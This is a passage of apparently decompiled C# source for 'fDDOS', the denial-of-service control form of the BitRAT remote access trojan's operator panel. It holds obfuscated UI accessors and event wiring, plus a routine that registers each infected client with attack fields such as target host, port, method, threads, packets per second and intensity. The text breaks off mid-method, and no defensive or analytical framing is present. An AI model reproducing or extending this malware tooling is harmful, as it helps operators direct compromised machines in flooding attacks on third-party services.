﻿using System;
using System.Collections;
using System.Collections.Concurrent;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using BitRAT;
using BrightIdeasSoftware;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using VisualPlus.Toolkit.Controls.Interactivity;

// Token: 0x02000100 RID: 256
[DesignerGenerated]
public sealed partial class fDDOS : Form
{
	// Token: 0x06000D6E RID: 3438 RVA: 0x00067DD8 File Offset: 0x00065FD8
	public fDDOS()
	{
		base.Load += this.fDDOS_Load;
		base.Closing += this.fDDOS_Closing;
		this.concurrentStack_0 = new ConcurrentStack<cDOScli>();
		this.concurrentStack_1 = new ConcurrentStack<cDOScli>();
		this.concurrentStack_2 = new ConcurrentStack<cDOScli>();
		this.InitializeComponent();
	}

	// Token: 0x06000D71 RID: 3441 RVA: 0x00008158 File Offset: 0x00006358
	internal VisualButton vmethod_0()
	{
		return this.visualButton_0;
	}

	// Token: 0x06000D72 RID: 3442 RVA: 0x0006A1C0 File Offset: 0x000683C0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_1(VisualButton visualButton_2)
	{
		EventHandler value = new EventHandler(this.method_25);
		VisualButton visualButton = this.visualButton_0;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_0 = visualButton_2;
		visualButton = this.visualButton_0;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06000D73 RID: 3443 RVA: 0x00008160 File Offset: 0x00006360
	internal VisualButton vmethod_2()
	{
		return this.visualButton_1;
	}

	// Token: 0x06000D74 RID: 3444 RVA: 0x0006A204 File Offset: 0x00068404
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_3(VisualButton visualButton_2)
	{
		EventHandler value = new EventHandler(this.method_22);
		VisualButton visualButton = this.visualButton_1;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_1 = visualButton_2;
		visualButton = this.visualButton_1;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06000D75 RID: 3445 RVA: 0x00008168 File Offset: 0x00006368
	internal BackgroundWorker vmethod_4()
	{
		return this.backgroundWorker_0;
	}

	// Token: 0x06000D76 RID: 3446 RVA: 0x0006A248 File Offset: 0x00068448
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_5(BackgroundWorker backgroundWorker_1)
	{
		DoWorkEventHandler value = new DoWorkEventHandler(this.method_9);
		BackgroundWorker backgroundWorker = this.backgroundWorker_0;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork -= value;
		}
		this.backgroundWorker_0 = backgroundWorker_1;
		backgroundWorker = this.backgroundWorker_0;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork += value;
		}
	}

	// Token: 0x06000D77 RID: 3447 RVA: 0x00008170 File Offset: 0x00006370
	internal ComboBox vmethod_6()
	{
		return this.comboBox_0;
	}

	// Token: 0x06000D78 RID: 3448 RVA: 0x00008178 File Offset: 0x00006378
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_7(ComboBox comboBox_4)
	{
		this.comboBox_0 = comboBox_4;
	}

	// Token: 0x06000D79 RID: 3449 RVA: 0x00008181 File Offset: 0x00006381
	internal Label vmethod_8()
	{
		return this.label_0;
	}

	// Token: 0x06000D7A RID: 3450 RVA: 0x00008189 File Offset: 0x00006389
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_9(Label label_9)
	{
		this.label_0 = label_9;
	}

	// Token: 0x06000D7B RID: 3451 RVA: 0x00008192 File Offset: 0x00006392
	internal ComboBox vmethod_10()
	{
		return this.comboBox_1;
	}

	// Token: 0x06000D7C RID: 3452 RVA: 0x0006A28C File Offset: 0x0006848C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_11(ComboBox comboBox_4)
	{
		EventHandler value = new EventHandler(this.method_11);
		EventHandler value2 = new EventHandler(this.method_12);
		ComboBox comboBox = this.comboBox_1;
		if (comboBox != null)
		{
			comboBox.SelectedIndexChanged -= value;
			comboBox.SelectedValueChanged -= value2;
		}
		this.comboBox_1 = comboBox_4;
		comboBox = this.comboBox_1;
		if (comboBox != null)
		{
			comboBox.SelectedIndexChanged += value;
			comboBox.SelectedValueChanged += value2;
		}
	}

	// Token: 0x06000D7D RID: 3453 RVA: 0x0000819A File Offset: 0x0000639A
	internal Label vmethod_12()
	{
		return this.label_1;
	}

	// Token: 0x06000D7E RID: 3454 RVA: 0x000081A2 File Offset: 0x000063A2
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_13(Label label_9)
	{
		this.label_1 = label_9;
	}

	// Token: 0x06000D7F RID: 3455 RVA: 0x000081AB File Offset: 0x000063AB
	internal TextBox vmethod_14()
	{
		return this.textBox_0;
	}

	// Token: 0x06000D80 RID: 3456 RVA: 0x0006A2EC File Offset: 0x000684EC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_15(TextBox textBox_4)
	{
		EventHandler value = new EventHandler(this.method_17);
		EventHandler value2 = new EventHandler(this.method_18);
		EventHandler value3 = new EventHandler(this.method_19);
		TextBox textBox = this.textBox_0;
		if (textBox != null)
		{
			textBox.TextChanged -= value;
			textBox.GotFocus -= value2;
			textBox.LostFocus -= value3;
		}
		this.textBox_0 = textBox_4;
		textBox = this.textBox_0;
		if (textBox != null)
		{
			textBox.TextChanged += value;
			textBox.GotFocus += value2;
			textBox.LostFocus += value3;
		}
	}

	// Token: 0x06000D81 RID: 3457 RVA: 0x000081B3 File Offset: 0x000063B3
	internal Label vmethod_16()
	{
		return this.label_2;
	}

	// Token: 0x06000D82 RID: 3458 RVA: 0x000081BB File Offset: 0x000063BB
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_17(Label label_9)
	{
		this.label_2 = label_9;
	}

	// Token: 0x06000D83 RID: 3459 RVA: 0x000081C4 File Offset: 0x000063C4
	internal TextBox vmethod_18()
	{
		return this.textBox_1;
	}

	// Token: 0x06000D84 RID: 3460 RVA: 0x0006A368 File Offset: 0x00068568
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_19(TextBox textBox_4)
	{
		EventHandler value = new EventHandler(this.method_15);
		EventHandler value2 = new EventHandler(this.method_16);
		TextBox textBox = this.textBox_1;
		if (textBox != null)
		{
			textBox.GotFocus -= value;
			textBox.LostFocus -= value2;
		}
		this.textBox_1 = textBox_4;
		textBox = this.textBox_1;
		if (textBox != null)
		{
			textBox.GotFocus += value;
			textBox.LostFocus += value2;
		}
	}

	// Token: 0x06000D85 RID: 3461 RVA: 0x000081CC File Offset: 0x000063CC
	internal Label vmethod_20()
	{
		return this.label_3;
	}

	// Token: 0x06000D86 RID: 3462 RVA: 0x000081D4 File Offset: 0x000063D4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_21(Label label_9)
	{
		this.label_3 = label_9;
	}

	// Token: 0x06000D87 RID: 3463 RVA: 0x000081DD File Offset: 0x000063DD
	internal RadioButton vmethod_22()
	{
		return this.radioButton_0;
	}

	// Token: 0x06000D88 RID: 3464 RVA: 0x000081E5 File Offset: 0x000063E5
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_23(RadioButton radioButton_2)
	{
		this.radioButton_0 = radioButton_2;
	}

	// Token: 0x06000D89 RID: 3465 RVA: 0x000081EE File Offset: 0x000063EE
	internal RadioButton vmethod_24()
	{
		return this.radioButton_1;
	}

	// Token: 0x06000D8A RID: 3466 RVA: 0x000081F6 File Offset: 0x000063F6
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_25(RadioButton radioButton_2)
	{
		this.radioButton_1 = radioButton_2;
	}

	// Token: 0x06000D8B RID: 3467 RVA: 0x000081FF File Offset: 0x000063FF
	internal System.Windows.Forms.Timer vmethod_26()
	{
		return this.timer_0;
	}

	// Token: 0x06000D8C RID: 3468 RVA: 0x0006A3C8 File Offset: 0x000685C8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_27(System.Windows.Forms.Timer timer_1)
	{
		EventHandler value = new EventHandler(this.method_10);
		System.Windows.Forms.Timer timer = this.timer_0;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		this.timer_0 = timer_1;
		timer = this.timer_0;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	// Token: 0x06000D8D RID: 3469 RVA: 0x00008207 File Offset: 0x00006407
	internal StatusStrip vmethod_28()
	{
		return this.statusStrip_0;
	}

	// Token: 0x06000D8E RID: 3470 RVA: 0x0000820F File Offset: 0x0000640F
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_29(StatusStrip statusStrip_1)
	{
		this.statusStrip_0 = statusStrip_1;
	}

	// Token: 0x06000D8F RID: 3471 RVA: 0x00008218 File Offset: 0x00006418
	internal ToolStripStatusLabel vmethod_30()
	{
		return this.toolStripStatusLabel_0;
	}

	// Token: 0x06000D90 RID: 3472 RVA: 0x00008220 File Offset: 0x00006420
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_31(ToolStripStatusLabel toolStripStatusLabel_5)
	{
		this.toolStripStatusLabel_0 = toolStripStatusLabel_5;
	}

	// Token: 0x06000D91 RID: 3473 RVA: 0x00008229 File Offset: 0x00006429
	internal ToolStripStatusLabel vmethod_32()
	{
		return this.toolStripStatusLabel_1;
	}

	// Token: 0x06000D92 RID: 3474 RVA: 0x00008231 File Offset: 0x00006431
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_33(ToolStripStatusLabel toolStripStatusLabel_5)
	{
		this.toolStripStatusLabel_1 = toolStripStatusLabel_5;
	}

	// Token: 0x06000D93 RID: 3475 RVA: 0x0000823A File Offset: 0x0000643A
	internal ToolStripStatusLabel vmethod_34()
	{
		return this.toolStripStatusLabel_2;
	}

	// Token: 0x06000D94 RID: 3476 RVA: 0x00008242 File Offset: 0x00006442
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_35(ToolStripStatusLabel toolStripStatusLabel_5)
	{
		this.toolStripStatusLabel_2 = toolStripStatusLabel_5;
	}

	// Token: 0x06000D95 RID: 3477 RVA: 0x0000824B File Offset: 0x0000644B
	internal ToolStripStatusLabel vmethod_36()
	{
		return this.toolStripStatusLabel_3;
	}

	// Token: 0x06000D96 RID: 3478 RVA: 0x00008253 File Offset: 0x00006453
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_37(ToolStripStatusLabel toolStripStatusLabel_5)
	{
		this.toolStripStatusLabel_3 = toolStripStatusLabel_5;
	}

	// Token: 0x06000D97 RID: 3479 RVA: 0x0000825C File Offset: 0x0000645C
	internal FastObjectListView vmethod_38()
	{
		return this.fastObjectListView_0;
	}

	// Token: 0x06000D98 RID: 3480 RVA: 0x0006A40C File Offset: 0x0006860C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_39(FastObjectListView fastObjectListView_1)
	{
		EventHandler<FormatRowEventArgs> eventHandler = new EventHandler<FormatRowEventArgs>(this.method_6);
		KeyEventHandler value = new KeyEventHandler(this.method_7);
		EventHandler value2 = new EventHandler(this.method_26);
		FastObjectListView fastObjectListView = this.fastObjectListView_0;
		if (fastObjectListView != null)
		{
			fastObjectListView.FormatRow -= eventHandler;
			fastObjectListView.KeyDown -= value;
			fastObjectListView.SelectedIndexChanged -= value2;
		}
		this.fastObjectListView_0 = fastObjectListView_1;
		fastObjectListView = this.fastObjectListView_0;
		if (fastObjectListView != null)
		{
			fastObjectListView.FormatRow += eventHandler;
			fastObjectListView.KeyDown += value;
			fastObjectListView.SelectedIndexChanged += value2;
		}
	}

	// Token: 0x06000D99 RID: 3481 RVA: 0x00008264 File Offset: 0x00006464
	internal OLVColumn vmethod_40()
	{
		return this.olvcolumn_0;
	}

	// Token: 0x06000D9A RID: 3482 RVA: 0x0000826C File Offset: 0x0000646C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_41(OLVColumn olvcolumn_13)
	{
		this.olvcolumn_0 = olvcolumn_13;
	}

	// Token: 0x06000D9B RID: 3483 RVA: 0x00008275 File Offset: 0x00006475
	internal OLVColumn vmethod_42()
	{
		return this.olvcolumn_1;
	}

	// Token: 0x06000D9C RID: 3484 RVA: 0x0000827D File Offset: 0x0000647D
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_43(OLVColumn olvcolumn_13)
	{
		this.olvcolumn_1 = olvcolumn_13;
	}

	// Token: 0x06000D9D RID: 3485 RVA: 0x00008286 File Offset: 0x00006486
	internal OLVColumn vmethod_44()
	{
		return this.olvcolumn_2;
	}

	// Token: 0x06000D9E RID: 3486 RVA: 0x0000828E File Offset: 0x0000648E
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_45(OLVColumn olvcolumn_13)
	{
		this.olvcolumn_2 = olvcolumn_13;
	}

	// Token: 0x06000D9F RID: 3487 RVA: 0x00008297 File Offset: 0x00006497
	internal OLVColumn vmethod_46()
	{
		return this.olvcolumn_3;
	}

	// Token: 0x06000DA0 RID: 3488 RVA: 0x0000829F File Offset: 0x0000649F
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_47(OLVColumn olvcolumn_13)
	{
		this.olvcolumn_3 = olvcolumn_13;
	}

	// Token: 0x06000DA1 RID: 3489 RVA: 0x000082A8 File Offset: 0x000064A8
	internal OLVColumn vmethod_48()
	{
		return this.olvcolumn_4;
	}

	// Token: 0x06000DA2 RID: 3490 RVA: 0x000082B0 File Offset: 0x000064B0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_49(OLVColumn olvcolumn_13)
	{
		this.olvcolumn_4 = olvcolumn_13;
	}

	// Token: 0x06000DA3 RID: 3491 RVA: 0x000082B9 File Offset: 0x000064B9
	internal OLVColumn vmethod_50()
	{
		return this.olvcolumn_5;
	}

	// Token: 0x06000DA4 RID: 3492 RVA: 0x000082C1 File Offset: 0x000064C1
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_51(OLVColumn olvcolumn_13)
	{
		this.olvcolumn_5 = olvcolumn_13;
	}

	// Token: 0x06000DA5 RID: 3493 RVA: 0x000082CA File Offset: 0x000064CA
	internal OLVColumn vmethod_52()
	{
		return this.olvcolumn_6;
	}

	// Token: 0x06000DA6 RID: 3494 RVA: 0x000082D2 File Offset: 0x000064D2
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_53(OLVColumn olvcolumn_13)
	{
		this.olvcolumn_6 = olvcolumn_13;
	}

	// Token: 0x06000DA7 RID: 3495 RVA: 0x000082DB File Offset: 0x000064DB
	internal OLVColumn vmethod_54()
	{
		return this.olvcolumn_7;
	}

	// Token: 0x06000DA8 RID: 3496 RVA: 0x000082E3 File Offset: 0x000064E3
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_55(OLVColumn olvcolumn_13)
	{
		this.olvcolumn_7 = olvcolumn_13;
	}

	// Token: 0x06000DA9 RID: 3497 RVA: 0x000082EC File Offset: 0x000064EC
	internal OLVColumn vmethod_56()
	{
		return this.olvcolumn_8;
	}

	// Token: 0x06000DAA RID: 3498 RVA: 0x000082F4 File Offset: 0x000064F4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_57(OLVColumn olvcolumn_13)
	{
		this.olvcolumn_8 = olvcolumn_13;
	}

	// Token: 0x06000DAB RID: 3499 RVA: 0x000082FD File Offset: 0x000064FD
	internal ContextMenuStrip vmethod_58()
	{
		return this.contextMenuStrip_0;
	}

	// Token: 0x06000DAC RID: 3500 RVA: 0x00008305 File Offset: 0x00006505
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_59(ContextMenuStrip contextMenuStrip_1)
	{
		this.contextMenuStrip_0 = contextMenuStrip_1;
	}

	// Token: 0x06000DAD RID: 3501 RVA: 0x0000830E File Offset: 0x0000650E
	internal ToolStripMenuItem vmethod_60()
	{
		return this.toolStripMenuItem_0;
	}

	// Token: 0x06000DAE RID: 3502 RVA: 0x00008316 File Offset: 0x00006516
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_61(ToolStripMenuItem toolStripMenuItem_5)
	{
		this.toolStripMenuItem_0 = toolStripMenuItem_5;
	}

	// Token: 0x06000DAF RID: 3503 RVA: 0x0000831F File Offset: 0x0000651F
	internal ToolStripMenuItem vmethod_62()
	{
		return this.toolStripMenuItem_1;
	}

	// Token: 0x06000DB0 RID: 3504 RVA: 0x0006A488 File Offset: 0x00068688
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_63(ToolStripMenuItem toolStripMenuItem_5)
	{
		EventHandler value = new EventHandler(this.method_27);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_1;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_1 = toolStripMenuItem_5;
		toolStripMenuItem = this.toolStripMenuItem_1;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000DB1 RID: 3505 RVA: 0x00008327 File Offset: 0x00006527
	internal ToolStripSeparator vmethod_64()
	{
		return this.toolStripSeparator_0;
	}

	// Token: 0x06000DB2 RID: 3506 RVA: 0x0000832F File Offset: 0x0000652F
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_65(ToolStripSeparator toolStripSeparator_2)
	{
		this.toolStripSeparator_0 = toolStripSeparator_2;
	}

	// Token: 0x06000DB3 RID: 3507 RVA: 0x00008338 File Offset: 0x00006538
	internal ToolStripMenuItem vmethod_66()
	{
		return this.toolStripMenuItem_2;
	}

	// Token: 0x06000DB4 RID: 3508 RVA: 0x00008340 File Offset: 0x00006540
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_67(ToolStripMenuItem toolStripMenuItem_5)
	{
		this.toolStripMenuItem_2 = toolStripMenuItem_5;
	}

	// Token: 0x06000DB5 RID: 3509 RVA: 0x00008349 File Offset: 0x00006549
	internal ToolStripMenuItem vmethod_68()
	{
		return this.toolStripMenuItem_3;
	}

	// Token: 0x06000DB6 RID: 3510 RVA: 0x0006A4CC File Offset: 0x000686CC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_69(ToolStripMenuItem toolStripMenuItem_5)
	{
		EventHandler value = new EventHandler(this.method_28);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_3;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_3 = toolStripMenuItem_5;
		toolStripMenuItem = this.toolStripMenuItem_3;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000DB7 RID: 3511 RVA: 0x00008351 File Offset: 0x00006551
	internal ToolStripSeparator vmethod_70()
	{
		return this.toolStripSeparator_1;
	}

	// Token: 0x06000DB8 RID: 3512 RVA: 0x00008359 File Offset: 0x00006559
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_71(ToolStripSeparator toolStripSeparator_2)
	{
		this.toolStripSeparator_1 = toolStripSeparator_2;
	}

	// Token: 0x06000DB9 RID: 3513 RVA: 0x00008362 File Offset: 0x00006562
	internal ToolStripMenuItem vmethod_72()
	{
		return this.toolStripMenuItem_4;
	}

	// Token: 0x06000DBA RID: 3514 RVA: 0x0006A510 File Offset: 0x00068710
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_73(ToolStripMenuItem toolStripMenuItem_5)
	{
		EventHandler value = new EventHandler(this.method_29);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_4;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_4 = toolStripMenuItem_5;
		toolStripMenuItem = this.toolStripMenuItem_4;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000DBB RID: 3515 RVA: 0x0000836A File Offset: 0x0000656A
	internal OLVColumn vmethod_74()
	{
		return this.olvcolumn_9;
	}

	// Token: 0x06000DBC RID: 3516 RVA: 0x00008372 File Offset: 0x00006572
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_75(OLVColumn olvcolumn_13)
	{
		this.olvcolumn_9 = olvcolumn_13;
	}

	// Token: 0x06000DBD RID: 3517 RVA: 0x0000837B File Offset: 0x0000657B
	internal ComboBox vmethod_76()
	{
		return this.comboBox_2;
	}

	// Token: 0x06000DBE RID: 3518 RVA: 0x00008383 File Offset: 0x00006583
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_77(ComboBox comboBox_4)
	{
		this.comboBox_2 = comboBox_4;
	}

	// Token: 0x06000DBF RID: 3519 RVA: 0x0000838C File Offset: 0x0000658C
	internal Label vmethod_78()
	{
		return this.label_4;
	}

	// Token: 0x06000DC0 RID: 3520 RVA: 0x00008394 File Offset: 0x00006594
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_79(Label label_9)
	{
		this.label_4 = label_9;
	}

	// Token: 0x06000DC1 RID: 3521 RVA: 0x0000839D File Offset: 0x0000659D
	internal Label vmethod_80()
	{
		return this.label_5;
	}

	// Token: 0x06000DC2 RID: 3522 RVA: 0x000083A5 File Offset: 0x000065A5
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_81(Label label_9)
	{
		this.label_5 = label_9;
	}

	// Token: 0x06000DC3 RID: 3523 RVA: 0x000083AE File Offset: 0x000065AE
	internal TextBox vmethod_82()
	{
		return this.textBox_2;
	}

	// Token: 0x06000DC4 RID: 3524 RVA: 0x0006A554 File Offset: 0x00068754
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_83(TextBox textBox_4)
	{
		EventHandler value = new EventHandler(this.method_20);
		EventHandler value2 = new EventHandler(this.method_21);
		TextBox textBox = this.textBox_2;
		if (textBox != null)
		{
			textBox.GotFocus -= value;
			textBox.LostFocus -= value2;
		}
		this.textBox_2 = textBox_4;
		textBox = this.textBox_2;
		if (textBox != null)
		{
			textBox.GotFocus += value;
			textBox.LostFocus += value2;
		}
	}

	// Token: 0x06000DC5 RID: 3525 RVA: 0x000083B6 File Offset: 0x000065B6
	internal PictureBox vmethod_84()
	{
		return this.pictureBox_0;
	}

	// Token: 0x06000DC6 RID: 3526 RVA: 0x0006A5B4 File Offset: 0x000687B4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_85(PictureBox pictureBox_3)
	{
		EventHandler value = new EventHandler(this.method_13);
		PictureBox pictureBox = this.pictureBox_0;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_0 = pictureBox_3;
		pictureBox = this.pictureBox_0;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06000DC7 RID: 3527 RVA: 0x000083BE File Offset: 0x000065BE
	internal ComboBox vmethod_86()
	{
		return this.comboBox_3;
	}

	// Token: 0x06000DC8 RID: 3528 RVA: 0x000083C6 File Offset: 0x000065C6
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_87(ComboBox comboBox_4)
	{
		this.comboBox_3 = comboBox_4;
	}

	// Token: 0x06000DC9 RID: 3529 RVA: 0x000083CF File Offset: 0x000065CF
	internal Label vmethod_88()
	{
		return this.label_6;
	}

	// Token: 0x06000DCA RID: 3530 RVA: 0x000083D7 File Offset: 0x000065D7
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_89(Label label_9)
	{
		this.label_6 = label_9;
	}

	// Token: 0x06000DCB RID: 3531 RVA: 0x000083E0 File Offset: 0x000065E0
	internal PictureBox vmethod_90()
	{
		return this.pictureBox_1;
	}

	// Token: 0x06000DCC RID: 3532 RVA: 0x0006A5F8 File Offset: 0x000687F8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_91(PictureBox pictureBox_3)
	{
		EventHandler value = new EventHandler(this.method_14);
		PictureBox pictureBox = this.pictureBox_1;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_1 = pictureBox_3;
		pictureBox = this.pictureBox_1;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06000DCD RID: 3533 RVA: 0x000083E8 File Offset: 0x000065E8
	internal Label vmethod_92()
	{
		return this.label_7;
	}

	// Token: 0x06000DCE RID: 3534 RVA: 0x000083F0 File Offset: 0x000065F0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_93(Label label_9)
	{
		this.label_7 = label_9;
	}

	// Token: 0x06000DCF RID: 3535 RVA: 0x000083F9 File Offset: 0x000065F9
	internal TextBox vmethod_94()
	{
		return this.textBox_3;
	}

	// Token: 0x06000DD0 RID: 3536 RVA: 0x0006A63C File Offset: 0x0006883C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_95(TextBox textBox_4)
	{
		EventHandler value = new EventHandler(this.method_23);
		TextBox textBox = this.textBox_3;
		if (textBox != null)
		{
			textBox.TextChanged -= value;
		}
		this.textBox_3 = textBox_4;
		textBox = this.textBox_3;
		if (textBox != null)
		{
			textBox.TextChanged += value;
		}
	}

	// Token: 0x06000DD1 RID: 3537 RVA: 0x00008401 File Offset: 0x00006601
	internal Label vmethod_96()
	{
		return this.label_8;
	}

	// Token: 0x06000DD2 RID: 3538 RVA: 0x00008409 File Offset: 0x00006609
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_97(Label label_9)
	{
		this.label_8 = label_9;
	}

	// Token: 0x06000DD3 RID: 3539 RVA: 0x00008412 File Offset: 0x00006612
	internal PictureBox vmethod_98()
	{
		return this.pictureBox_2;
	}

	// Token: 0x06000DD4 RID: 3540 RVA: 0x0006A680 File Offset: 0x00068880
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_99(PictureBox pictureBox_3)
	{
		EventHandler value = new EventHandler(this.method_24);
		PictureBox pictureBox = this.pictureBox_2;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_2 = pictureBox_3;
		pictureBox = this.pictureBox_2;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06000DD5 RID: 3541 RVA: 0x0000841A File Offset: 0x0000661A
	internal OLVColumn vmethod_100()
	{
		return this.olvcolumn_10;
	}

	// Token: 0x06000DD6 RID: 3542 RVA: 0x00008422 File Offset: 0x00006622
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_101(OLVColumn olvcolumn_13)
	{
		this.olvcolumn_10 = olvcolumn_13;
	}

	// Token: 0x06000DD7 RID: 3543 RVA: 0x0000842B File Offset: 0x0000662B
	internal OLVColumn vmethod_102()
	{
		return this.olvcolumn_11;
	}

	// Token: 0x06000DD8 RID: 3544 RVA: 0x00008433 File Offset: 0x00006633
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_103(OLVColumn olvcolumn_13)
	{
		this.olvcolumn_11 = olvcolumn_13;
	}

	// Token: 0x06000DD9 RID: 3545 RVA: 0x0000843C File Offset: 0x0000663C
	internal OLVColumn vmethod_104()
	{
		return this.olvcolumn_12;
	}

	// Token: 0x06000DDA RID: 3546 RVA: 0x00008444 File Offset: 0x00006644
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_105(OLVColumn olvcolumn_13)
	{
		this.olvcolumn_12 = olvcolumn_13;
	}

	// Token: 0x06000DDB RID: 3547 RVA: 0x0000844D File Offset: 0x0000664D
	internal ToolStripStatusLabel vmethod_106()
	{
		return this.toolStripStatusLabel_4;
	}

	// Token: 0x06000DDC RID: 3548 RVA: 0x00008455 File Offset: 0x00006655
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_107(ToolStripStatusLabel toolStripStatusLabel_5)
	{
		this.toolStripStatusLabel_4 = toolStripStatusLabel_5;
	}

	// Token: 0x06000DDD RID: 3549 RVA: 0x0006A6C4 File Offset: 0x000688C4
	public void method_0(string string_0, string string_1)
	{
		if (this.vmethod_38().InvokeRequired)
		{
			this.vmethod_38().Invoke(new fDDOS.Delegate69(this.method_0), new object[]
			{
				string_0,
				string_1
			});
			return;
		}
		checked
		{
			if (!Class130.concurrentDictionary_5.ContainsKey(string_0))
			{
				if (Operators.CompareString(string_1, null, true) == 0)
				{
					string_1 = Class130.concurrentDictionary_3[string_0].sUser;
				}
				cDOScli cDOScli = new cDOScli();
				cDOScli.USER = Class130.concurrentDictionary_3[string_0].USER;
				cDOScli.Key = string_0;
				cDOScli.TARGET_HOST = "N/A";
				cDOScli.TARGET_PORT = "N/A";
				cDOScli.PROTOCOL = "N/A";
				cDOScli.METHOD = "N/A";
				cDOScli.THREADS = "N/A";
				cDOScli.PPS = "N/A";
				cDOScli.DURATION = "N/A";
				cDOScli.PACKET_SIZE = "N/A";
				cDOScli.BYTES_SENT = "N/A";
				cDOScli.INTENSITY = "N/A";
				cDOScli.SPEED = "N/A";
				cDOScli.STATUS = "N/A";
				cDOScli.bJustConnected = true;
				int num = cDOScli.idxValues.Count<string>() - 1;
				for (int i = 1; i <= num; i++)
				{
					cDOScli.idxValues[i] = "N/A";
				}
				Class130.concurrentDictionary_5.TryAdd(string_0, cDOScli);
				Class130.concurrentDictionary_5[string_0].Key = string_0;
				this.concurrentStack_0.Push(cDOScli);
			}
		}
	}

	// Token: 0x06000DDE RID: 3550 RVA: 0x0006A834 File Offset: 0x00068A34
	public void method_1(string string_0, string[] string_1)
	{
		checked
		{
			if (Class130.concurrentDictionary_5.ContainsKey(string_0))
			{
				if (this.vmethod_38().InvokeRequired)
				{
